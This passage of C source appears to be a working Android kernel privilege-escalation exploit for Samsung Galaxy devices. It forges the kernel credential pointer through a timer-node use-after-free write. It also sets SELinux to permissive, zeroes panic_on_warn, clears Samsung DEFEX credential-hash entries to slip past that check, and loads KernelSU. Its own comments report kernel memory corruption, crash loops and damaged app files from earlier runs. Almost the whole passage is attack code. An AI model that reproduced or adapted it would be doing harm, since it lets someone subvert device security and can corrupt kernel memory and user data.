                 "reboot)\n");
            /*
             * Android sets SECURE_NOROOT in securebits; with it set the
             * euid=0 exec never re-grants the bset, so the shell has no
             * CAP_SETGID and cannot add the /data groups.  Clear
             * securebits on the child's real cred.
             */
            if (stage_write(R + CRED_SECUREBITS_OFF, 0, "securebits",
                            raw, NULL, 0))
                park_forever("securebits write failed");
            logf("[+] real cred securebits cleared (SECURE_NOROOT off)\n");
        }
        /*
         * Diagnostic: zero-plant selinux_state.enforcing (offset 0) first.
         * getenforce then reveals whether the rb_erase write lands at all.
         */
        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
            logf("[-] selinux plant failed (write did not fire)\n");
        else
            logf("[+] selinux plant done; check getenforce\n");
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw, 0);
        }
        if (!r.ok)
            park_forever("no successful plant");
    }
    else if (g_umh_stage)
    {
        /*
         * UMH injection stage (fusion-s24u flow): make SELinux permissive
         * and set the DEFEX enforce gate, then link a fake work_struct
         * (func = call_usermodehelper_exec_work, subprocess_info fully
         * inside the reclaimed page) into the system_unbound_wq pool
         * worklist.  The kernel spawns ROOT_UMH_PATH as a legitimate root
         * usermodehelper -- no cred forgery, so DEFEX never triggers.
         */
        if (!g_slide_set)
            park_forever("no KASLR slide");
        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
            park_forever("selinux write failed");
        logf("[+] selinux permissive\n");
        {
            struct plant_res r;

            if (run_plant_once(CREDS_FAST_HASH_STATIC +
                                   (unsigned long long)getpid() * 8,
                               raw, &r))
                park_forever("defex hash clear failed");
        }
        logf("[+] DEFEX enforce gate set\n");
        /*
         * The pool worklist address is wq->dfl_pwq->pool->worklist, which
         * needs a read primitive we do not have.  Stub: this stage parks
         * until the pwq/pool leak (kmem trace on the alloc_workqueue
         * callsite) is wired up.
         */
        park_forever("umh stage: pool leak not wired yet");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        /*
         * The fake erase has to use the self-parent node (RB_EMPTY_NODE)
         * so that rb_next() returns NULL and the posix-cpu-timers exit
         * loop stops.  That takes timerqueue_del()'s WARN_ON_ONCE.  Zero
         * panic_on_warn first with a plain zero plant so the WARN cannot
         * turn into a reboot.
         */
        if (stage_write(0, 0, "panic_on_warn", raw, NULL,
                        PANIC_ON_WARN_STATIC))
            park_forever("panic_on_warn pre-plant failed");
        /*
         * Clear the child's DEFEX stored-credential slot before the wake:
         * task_defex_check_creds() reads creds_hash[child_pid] and compares
         * the stored uid against the forged one; a zero entry matches uid 0
         * and the check passes ("mov w0, wzr; ret" path).
         */
        if (stage_write(0, 0, "defex_hash", raw, NULL,
                        CREDS_FAST_HASH_STATIC +
                            (unsigned long long)C * 8))
            park_forever("defex hash clear failed");
        logf("[+] DEFEX creds_hash[%d] cleared\n", C);
        /*
         * Point task->cred at the reclaimed node.  parent_color == node
         * makes rb_erase write the node address into task->cred; the
         * erase dirties uid (parent color high half), gid/suid
         * (__rb_change_child target) and sgid/euid (rb_left target).
         * The two zero plants below repair uid/gid and euid/egid.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc, 0))
            park_forever("fake cred write failed");
        /* From here the child's task->cred points into the fake pool page. */
        g_cred_live = 1;
        /* A genuine slide of 0 is valid (64KB-granular KASLR can draw 0);
         * only park when no plant ever computed a slide. */
        if (!g_slide_set)
            park_forever("no KASLR slide");
        logf("[+] fake cred=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        /*
         * The zero plant writes 8 bytes at once.  selinux_state is
         * { enforcing(0), checkreqprot(1), initialized(2), policycap[](3..) }
         * (verified in our vmlinux: security_sid_to_context_core reads the
         * byte at +2 with TBNZ bit 0).  Writing at +0 would clear
         * "initialized" too, and the kernel then treats every SID as
         * "before initial load_policy": getpeercon() fails with EINVAL, all
         * property sets get PROP_ERROR_PERMISSION_DENIED, system_server
         * dies on its next property set and the softdog eventually panics
         * the phone -- exactly the crash loop of the first three app runs.
         *
         * Instead aim the 8-byte zero at selinux_state-7 (same as the shell
         * mode): the window covers the tail bytes of the idle
         * avc_latest_notif_update.notif_lock at -8 (4-byte qspinlock +
         * padding -- zeroing is a no-op while uncontended), plus padding,
         * plus enforcing itself.  initialized stays 1.
         */
        if (stage_write(SELINUX_ENFORCE_ZAP + g_slide, 0,
                        "selinux", raw, NULL, 0))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0 &&
            stage_write(PANIC_ON_WARN_STATIC, 0,
                        "panic_on_warn", raw, NULL, 0))
            park_forever("panic_on_warn write failed");
        /*
         * DIAGNOSTIC: keep uid 2000 instead of 0.  If the child survives
         * the wake now, the killer targets uid==0 specifically (DEFEX/KDP
         * credential check); if it still dies, the cause is elsewhere
         * (page lifetime / refcount / context).
         */
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL, 0))
            park_forever("fake uid fix failed");
        if (stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL, 0))
            park_forever("fake euid fix failed");
        /*
         * suid/sgid sit at +0xC and land on the node's target field
         * (sgid = garbage low bits of &task->cred).  Zero them too so no
         * forged-cred process ever carries a junk gid anywhere.
         */
        if (stage_write(fc.A + 0xC, 0, "fake_suid", raw, NULL, 0))
            park_forever("fake suid fix failed");
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    /* The child is gone; nothing references the fake cred page anymore. */
    g_cred_live = 0;
    if (g_fake_stage)
    {
        /*
         * Authoritative success check (RootMyGalaxy verify_kernelsu_control)
         * replaces the script-side /proc/modules grep: the module can be
         * listed yet broken, and only the driver ioctl proves the control
         * path works.  The app greps stdout for KSU_LOADED.
         */
        if (verify_ksu_control() == 0)
            logf("KSU_LOADED\n");
        else
            logf("KSU_MISSING\n");
        /*
         * KSU is loaded by now and su(0) goes through the KSU path, so the
         * fake cred page is no longer required.  Drain the fake pool to
         * release the ~2GB of queued skb data -- a holder parking on that
         * starves kernel threads and the softdog panics ~100s later
         * (verified twice in kmsg).
         *
         * Exiting is only safe when no failed-plant zombies are held.
         * This process's death reparents them to init, which reaps them,
         * and release_task() then runs cleanup_timerqueue() on their
         * stale nodes -- nodes that live in pages the drain just freed
         * and the allocator handed to whoever came next.  That UAF write
         * corrupted arbitrary kernel data on the first app run (mass app
         * kills, damaged on-disk app file metadata, panic).  With
         * zombies held, park instead: the pools are drained by then, so
         * parking is cheap and the phone stays responsive.
         */
        /*
         * Only free the spray pool once the script confirmed that nothing
         * survives holding the forged cred: the cred is a node in one of
         * these pages, and a dangling cred in a live process corrupts
         * kernel memory the moment it is touched (su handling, or
         * exit_creds when init's cleanup kills the holder).
         */
        {
            char ok[16] = {0};
            int cfd = open("/data/local/tmp/samtimer/cleanup.ok", O_RDONLY);

            if (cfd >= 0)
            {
                (void)!read(cfd, ok, sizeof(ok) - 1);
                close(cfd);
            }
            if (strncmp(ok, "done", 4))
            {
                logf("[!] cleanup not confirmed (\"%s\") -- keeping the "
                     "spray pool alive; park\n",
                     ok);
                g_cred_live = 1;
                logf("PARKED_AFTER_SUCCESS\n");
                park_forever("cred holder may remain; holding spray pool");
            }
        }
        drain_spray(1);
        logf("[+] fake pool drained; KSU holds root now\n");
        if (g_held)
        {
            logf("[!] %d failed-plant zombie(s) held; this process stays "
                 "alive as the holder\n",
                 g_held);
            logf("PARKED_AFTER_SUCCESS\n");
            park_forever("fake stage done; zombie holder until reboot");
        }
        logf("[+] done (reboot reverts to stock; rerun to re-root)\n");
        return 0;
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
